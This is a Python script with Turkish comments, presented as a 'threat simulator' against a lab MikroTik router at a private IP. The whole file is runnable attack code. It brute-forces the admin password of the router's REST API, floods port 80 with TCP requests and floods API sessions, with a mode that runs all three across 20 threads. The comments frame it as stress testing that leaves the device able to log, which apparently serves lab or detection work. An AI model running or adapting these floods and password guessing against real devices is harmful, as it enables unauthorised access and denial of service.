import requests
import threading
import time
import socket
import random

hedef_ip = "192.168.56.101"
url_api = f"http://{hedef_ip}/rest/system/resource"

# MikroTik'in tamamen kilitlenmemesi ve api.py'nin veri okuyabilmesi için 
# thread sayısını 20'de tutuyoruz.
thread_sayisi = 20 

def brute_force_saldirisi():
    """Rastgele şifreler deneyerek cihazın CPU'sunu kriptografi işlemleriyle yorar."""
    session = requests.Session()
    while True:
        try:
            sahte_sifre = str(random.randint(1000, 9999))
            session.get(url_api, auth=('admin', sahte_sifre), timeout=1)
            time.sleep(0.05) # Cihazın log verebilmesi için nefes payı
        except:
            time.sleep(0.05)

def ddos_saldirisi():
    """Bant genişliğini ve PPS (Paket/Saniye) değerini şişirmek için TCP paketleri yollar."""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((hedef_ip, 80))
            s.send(b"GET / HTTP/1.1\r\nHost: saldirgan\r\n\r\n")
            s.close()
            time.sleep(0.05) # Cihazın log verebilmesi için nefes payı
        except:
            time.sleep(0.05)

def worm_saldirisi():
    """Aynı API ucuna sürekli yüklenerek oturumları (sessions) ve CPU'yu şişirir."""
    session = requests.Session()
    while True:
        try:
            session.get(url_api, auth=('admin', 'yanlis_sifre'), timeout=1)
            time.sleep(0.05)
        except:
            time.sleep(0.05)

print("="*45)
print("🌐 GELİŞMİŞ TEHDİT SİMÜLATÖRÜ v2.0 🌐")
print("="*45)
print("1 - CPU Stres Testi (Brute Force)")
print("2 - Trafik Stres Testi (DDoS / Yüksek PPS)")
print("3 - API Flood Testi (Worm / Solucan)")
print("4 - Karma Saldırı (DDoS + Brute Force + Worm)")
print("="*45)

secim = input("Simüle etmek istediğiniz saldırı tipini seçin (1/2/3/4): ")

print(f"\n🚀 {hedef_ip} adresine saldırı başlatılıyor... (Durdurmak için CTRL+C)")
time.sleep(2)

threads = []

# Seçime göre çalışacak iş parçacıklarını (thread) belirliyoruz
if secim == '1':
    hedef_fonk = brute_force_saldirisi
elif secim == '2':
    hedef_fonk = ddos_saldirisi
elif secim == '3':
    hedef_fonk = worm_saldirisi
elif secim == '4':
    # KARMA SALDIRI: Thread'leri üç farklı saldırı tipine eşit olarak bölüştürür
    print("🔥 KARMA SALDIRI AKTİF: Tüm tehdit vektörleri aynı anda uygulanıyor!")
    for i in range(thread_sayisi):
        if i % 3 == 0:
            hedef = ddos_saldirisi
        elif i % 3 == 1:
            hedef = brute_force_saldirisi
        else:
            hedef = worm_saldirisi
            
        t = threading.Thread(target=hedef, daemon=True)
        threads.append(t)
        t.start()
else:
    print("Geçersiz seçim! Lütfen 1, 2, 3 veya 4 tuşlayın.")
    exit()

# Eğer 1, 2 veya 3 seçildiyse tüm thread'leri tek bir hedefe odaklarız
if secim in ['1', '2', '3']:
    for i in range(thread_sayisi):
        t = threading.Thread(target=hedef_fonk, daemon=True)
        threads.append(t)
        t.start()

# Programın kapanmaması için sonsuz döngü (CTRL+C ile çıkılır)
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\n🛑 Simülasyon başarıyla durduruldu.")